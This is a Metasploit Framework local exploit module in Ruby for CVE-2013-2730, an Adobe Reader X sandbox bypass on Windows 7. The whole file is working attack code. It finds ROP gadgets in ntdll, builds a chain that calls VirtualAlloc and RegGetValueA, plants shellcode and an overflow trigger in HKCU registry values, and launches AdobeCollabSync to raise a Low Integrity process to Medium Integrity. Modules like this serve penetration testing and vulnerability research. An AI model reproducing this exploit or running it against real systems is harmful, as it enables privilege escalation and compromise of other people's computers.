# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;msf/core/post/windows/registry&#039;
require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/file&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Exploit::EXE
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;          => &#039;AdobeCollabSync Buffer Overflow Adobe Reader X Sandbox Bypass&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability on Adobe Reader X Sandbox. The
        vulnerability is due to a sandbox rule allowing a Low Integrity AcroRd32.exe
        process to write register values which can be used to trigger a buffer overflow on
        the AdobeCollabSync component, allowing to achieve Medium Integrity Level
        privileges from a Low Integrity AcroRd32.exe process. This module has been tested
        successfully on Adobe Reader X 10.1.4 over Windows 7 SP1.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        =>
        [
          &#039;Felipe Andres Manzano&#039;, # Vulnerability discovery and PoC
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;    =>
        [
          [ &#039;CVE&#039;, &#039;2013-2730&#039; ],
          [ &#039;OSVDB&#039;, &#039;93355&#039; ],
          [ &#039;URL&#039;, &#039;http://blog.binamuse.com/2013/05/adobe-reader-x-collab-sandbox-bypass.html&#039; ]
        ],
      &#039;Arch&#039;          => ARCH_X86,
      &#039;Platform&#039;      => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 12288,
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;       =>
        [
          [ &#039;Adobe Reader X 10.1.4 / Windows 7 SP1&#039;,
            {
              &#039;AdobeCollabSyncTrigger&#039; => 0x18fa0,
              &#039;AdobeCollabSyncTriggerSignature&#039; => "\x56\x68\xBC\x00\x00\x00\xE8\xF5\xFD\xFF\xFF"
            }
          ],
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039;=> &#039;May 14 2013&#039;
    }))

  end

  def on_new_session
    print_status("Deleting Malicious Registry Keys...")
    if not registry_deletekey("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\shellcode")
      print_error("Delete HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\shellcode by yourself")
    end
    if not registry_deletekey("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\bDeleteDB")
      print_error("Delete HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\bDeleteDB by yourself")
    end
    print_status("Cleanup finished")
  end

  # Test the process integrity level by trying to create a directory on the TEMP folder
  # Access should be granted with Medium Integrity Level
  # Access should be denied with Low Integrity Level
  # Usint this solution atm because I&#039;m experiencing problems with railgun when trying
  # use GetTokenInformation
  def low_integrity_level?
    tmp_dir = expand_path("%TEMP%")
    cd(tmp_dir)
    new_dir = "#{rand_text_alpha(5)}"
    begin
      session.shell_command_token("mkdir #{new_dir}")
    rescue
      return true
    end

    if directory?(new_dir)
      session.shell_command_token("rmdir #{new_dir}")
      return false
    else
      return true
    end
  end

  def check_trigger
    signature = session.railgun.memread(@addresses[&#039;AcroRd32.exe&#039;] + target[&#039;AdobeCollabSyncTrigger&#039;], target[&#039;AdobeCollabSyncTriggerSignature&#039;].length)
    if signature == target[&#039;AdobeCollabSyncTriggerSignature&#039;]
      return true
    end
    return false
  end

  def collect_addresses
    # find the trigger to launch AdobeCollabSyncTrigger.exe from AcroRd32.exe
    @addresses[&#039;trigger&#039;] = @addresses[&#039;AcroRd32.exe&#039;] + target[&#039;AdobeCollabSyncTrigger&#039;]
    vprint_good("AdobeCollabSyncTrigger trigger address found at 0x#{@addresses[&#039;trigger&#039;].to_s(16)}")

    # find kernel32.dll
    kernel32 = session.railgun.kernel32.GetModuleHandleA("kernel32.dll")
    @addresses[&#039;kernel32.dll&#039;] = kernel32["return"]
    if @addresses[&#039;kernel32.dll&#039;] == 0
      fail_with(Exploit::Failure::Unknown, "Unable to find kernel32.dll")
    end
    vprint_good("kernel32.dll address found at 0x#{@addresses[&#039;kernel32.dll&#039;].to_s(16)}")

    # find kernel32.dll methods
    virtual_alloc = session.railgun.kernel32.GetProcAddress(@addresses[&#039;kernel32.dll&#039;], "VirtualAlloc")
    @addresses[&#039;VirtualAlloc&#039;] = virtual_alloc["return"]
    if @addresses[&#039;VirtualAlloc&#039;] == 0
      fail_with(Exploit::Failure::Unknown, "Unable to find VirtualAlloc")
    end
    vprint_good("VirtualAlloc address found at 0x#{@addresses[&#039;VirtualAlloc&#039;].to_s(16)}")

    reg_get_value = session.railgun.kernel32.GetProcAddress(@addresses[&#039;kernel32.dll&#039;], "RegGetValueA")
    @addresses[&#039;RegGetValueA&#039;] = reg_get_value["return"]
    if @addresses[&#039;RegGetValueA&#039;] == 0
      fail_with(Exploit::Failure::Unknown, "Unable to find RegGetValueA")
    end
    vprint_good("RegGetValueA address found at 0x#{@addresses[&#039;RegGetValueA&#039;].to_s(16)}")

    # find ntdll.dll
    ntdll = session.railgun.kernel32.GetModuleHandleA("ntdll.dll")
    @addresses[&#039;ntdll.dll&#039;] = ntdll["return"]
    if @addresses[&#039;ntdll.dll&#039;] == 0
      fail_with(Exploit::Failure::Unknown, "Unable to find ntdll.dll")
    end
    vprint_good("ntdll.dll address found at 0x#{@addresses[&#039;ntdll.dll&#039;].to_s(16)}")
  end

  # Search a gadget identified by pattern on the process memory
  def search_gadget(base, offset_start, offset_end, pattern)
    mem  = base + offset_start
    length = offset_end - offset_start
    mem_contents = session.railgun.memread(mem, length)
    return mem_contents.index(pattern)
  end

  # Search for gadgets on ntdll.dll
  def search_gadgets
    ntdll_text_base = 0x10000
    search_length =  0xd6000

    @gadgets[&#039;mov [edi], ecx # ret&#039;] = search_gadget(@addresses[&#039;ntdll.dll&#039;], ntdll_text_base, search_length, "\x89\x0f\xc3")
    if @gadgets[&#039;mov [edi], ecx # ret&#039;].nil?
      fail_with(Exploit::Failure::Unknown, "Unable to find gadget &#039;mov [edi], ecx # ret&#039;")
    end
    @gadgets[&#039;mov [edi], ecx # ret&#039;] += @addresses[&#039;ntdll.dll&#039;]
    @gadgets[&#039;mov [edi], ecx # ret&#039;] += ntdll_text_base
    vprint_good("Gadget &#039;mov [edi], ecx # ret&#039; found at 0x#{@gadgets[&#039;mov [edi], ecx # ret&#039;].to_s(16)}")

    @gadgets[&#039;ret&#039;] = @gadgets[&#039;mov [edi], ecx # ret&#039;] + 2
    vprint_good("Gadget &#039;ret&#039; found at 0x#{@gadgets[&#039;ret&#039;].to_s(16)}")

    @gadgets[&#039;pop edi # ret&#039;] = search_gadget(@addresses[&#039;ntdll.dll&#039;], ntdll_text_base, search_length, "\x5f\xc3")
    if @gadgets[&#039;pop edi # ret&#039;].nil?
      fail_with(Exploit::Failure::Unknown, "Unable to find gadget &#039;pop edi # ret&#039;")
    end
    @gadgets[&#039;pop edi # ret&#039;] += @addresses[&#039;ntdll.dll&#039;]
    @gadgets[&#039;pop edi # ret&#039;] += ntdll_text_base
    vprint_good("Gadget &#039;pop edi # ret&#039; found at 0x#{@gadgets[&#039;pop edi # ret&#039;].to_s(16)}")

    @gadgets[&#039;pop ecx # ret&#039;] = search_gadget(@addresses[&#039;ntdll.dll&#039;], ntdll_text_base, search_length, "\x59\xc3")
    if @gadgets[&#039;pop ecx # ret&#039;].nil?
      fail_with(Exploit::Failure::Unknown, "Unable to find gadget &#039;pop ecx # ret&#039;")
    end
    @gadgets[&#039;pop ecx # ret&#039;] += @addresses[&#039;ntdll.dll&#039;]
    @gadgets[&#039;pop ecx # ret&#039;] += ntdll_text_base
    vprint_good("Gadget &#039;pop edi # ret&#039; found at 0x#{@gadgets[&#039;pop ecx # ret&#039;].to_s(16)}")
  end

  def store(buf, data, address)
    i = 0
    while (i < data.length)
      buf << [@gadgets[&#039;pop edi # ret&#039;]].pack("V")
      buf << [address + i].pack("V") # edi
      buf << [@gadgets[&#039;pop ecx # ret&#039;]].pack("V")
      buf << data[i, 4].ljust(4,"\x00") # ecx
      buf << [@gadgets[&#039;mov [edi], ecx # ret&#039;]].pack("V")
      i = i + 4
    end
    return i
  end

  def create_rop_chain
    mem = 0x0c0c0c0c

    buf =  [0x58000000 + 1].pack("V")
    buf << [0x58000000 + 2].pack("V")
    buf << [0].pack("V")
    buf << [0x58000000 + 4].pack("V")

    buf << [0x58000000 + 5].pack("V")
    buf << [0x58000000 + 6].pack("V")
    buf << [0x58000000 + 7].pack("V")
    buf << [@gadgets[&#039;ret&#039;]].pack("V")
    buf << rand_text(8)

    # Allocate Memory To store the shellcode and the necessary data to read the
    # shellcode stored in the registry
    buf << [@addresses[&#039;VirtualAlloc&#039;]].pack("V")
    buf << [@gadgets[&#039;ret&#039;]].pack("V")
    buf << [mem].pack("V")        # lpAddress
    buf << [0x00010000].pack("V") # SIZE_T dwSize
    buf << [0x00003000].pack("V") # DWORD flAllocationType
    buf << [0x00000040].pack("V") # flProtect

    # Put in the allocated memory the necessary data in order to read the
    # shellcode stored in the registry
    # 1) The reg sub key: Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions
    reg_key = "Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\x00"
    reg_key_length = store(buf, reg_key, mem)
    # 2) The reg entry: shellcode
    value_key = "shellcode\x00"
    store(buf, value_key, mem + reg_key_length)
    # 3) The output buffer size: 0x3000
    size_buffer = 0x3000
    buf << [@gadgets[&#039;pop edi # ret&#039;]].pack("V")
    buf << [mem + 0x50].pack("V") # edi
    buf << [@gadgets[&#039;pop ecx # ret&#039;]].pack("V")
    buf << [size_buffer].pack("V")     # ecx
    buf << [@gadgets[&#039;mov [edi], ecx # ret&#039;]].pack("V")

    # Copy the shellcode from the the registry to the
    # memory allocated with executable permissions and
    # ret into there
    buf << [@addresses[&#039;RegGetValueA&#039;]].pack("V")
    buf << [mem + 0x1000].pack("V") # ret to shellcode
    buf << [0x80000001].pack("V")   # hkey => HKEY_CURRENT_USER
    buf << [mem].pack("V")          # lpSubKey
    buf << [mem + 0x3c].pack("V")   # lpValue
    buf << [0x0000FFFF].pack("V")   # dwFlags => RRF_RT_ANY
    buf << [0].pack("V")            # pdwType
    buf << [mem + 0x1000].pack("V") # pvData
    buf << [mem + 0x50].pack("V")   # pcbData
  end

  # Store shellcode and AdobeCollabSync.exe Overflow trigger in the Registry
  def store_data_registry(buf)
    vprint_status("Creating the Registry Key to store the shellcode...")

    if registry_createkey("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\shellcode")
      vprint_good("Registry Key created")
    else
      fail_with(Exploit::Failure::Unknown, "Failed to create the Registry Key to store the shellcode")
    end

    vprint_status("Storing the shellcode in the Registry...")

    if registry_setvaldata("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions", "shellcode", payload.encoded, "REG_BINARY")
      vprint_good("Shellcode stored")
    else
      fail_with(Exploit::Failure::Unknown, "Failed to store shellcode in the Registry")
    end

    # Create the Malicious registry entry in order to exploit....
    vprint_status("Creating the Registry Key to trigger the Overflow...")
    if registry_createkey("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\bDeleteDB")
      vprint_good("Registry Key created")
    else
      fail_with(Exploit::Failure::Unknown, "Failed to create the Registry Entry to trigger the Overflow")
    end

    vprint_status("Storing the trigger in the Registry...")
    if registry_setvaldata("HKCU\\Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions", "bDeleteDB", buf, "REG_BINARY")
      vprint_good("Trigger stored")
    else
      fail_with(Exploit::Failure::Unknown, "Failed to store the trigger in the Registry")
    end
  end

  def trigger_overflow
    vprint_status("Creating the thread to trigger the Overflow on AdobeCollabSync.exe...")
    # Create a thread in order to execute the necessary code to launch AdobeCollabSync
    ret = session.railgun.kernel32.CreateThread(nil, 0, @addresses[&#039;trigger&#039;], nil, "CREATE_SUSPENDED", nil)
    if ret[&#039;return&#039;] < 1
      print_error("Unable to CreateThread")
      return
    end
    hthread = ret[&#039;return&#039;]

    vprint_status("Resuming the Thread...")
    # Resume the thread to actually Launch AdobeCollabSync and trigger the vulnerability!
    ret = client.railgun.kernel32.ResumeThread(hthread)
    if ret[&#039;return&#039;] < 1
      fail_with(Exploit::Failure::Unknown, "Unable to ResumeThread")
    end
  end

  def check
    @addresses = {}
    acrord32 = session.railgun.kernel32.GetModuleHandleA("AcroRd32.exe")
    @addresses[&#039;AcroRd32.exe&#039;] = acrord32["return"]
    if @addresses[&#039;AcroRd32.exe&#039;] == 0
      return Msf::Exploit::CheckCode::Unknown
    elsif check_trigger
      return Msf::Exploit::CheckCode::Vulnerable
    else
      return Msf::Exploit::CheckCode::Detected
    end
  end

  def exploit
    @addresses = {}
    @gadgets = {}

    print_status("Verifying we&#039;re in the correct target process...")
    acrord32 = session.railgun.kernel32.GetModuleHandleA("AcroRd32.exe")
    @addresses[&#039;AcroRd32.exe&#039;] = acrord32["return"]
    if @addresses[&#039;AcroRd32.exe&#039;] == 0
      fail_with(Exploit::Failure::NoTarget, "AcroRd32.exe process not found")
    end
    vprint_good("AcroRd32.exe found at 0x#{@addresses[&#039;AcroRd32.exe&#039;].to_s(16)}")

    print_status("Checking the AcroRd32.exe image...")
    if not check_trigger
      fail_with(Exploit::Failure::NoTarget, "Please check the target, the AcroRd32.exe process doesn&#039;t match with the target")
    end

    print_status("Checking the Process Integrity Level...")
    if not low_integrity_level?
      fail_with(Exploit::Failure::NoTarget, "Looks like you don&#039;t need this Exploit since you&#039;re already enjoying Medium Level")
    end

    print_status("Collecting necessary addresses for exploit...")
    collect_addresses

    print_status("Searching the gadgets needed to build the ROP chain...")
    search_gadgets
    print_good("Gadgets collected...")

    print_status("Building the ROP chain...")
    buf = create_rop_chain
    print_good("ROP chain ready...")

    print_status("Storing the shellcode and the trigger in the Registry...")
    store_data_registry(buf)

    print_status("Executing AdobeCollabSync.exe...")
    trigger_overflow
  end
end

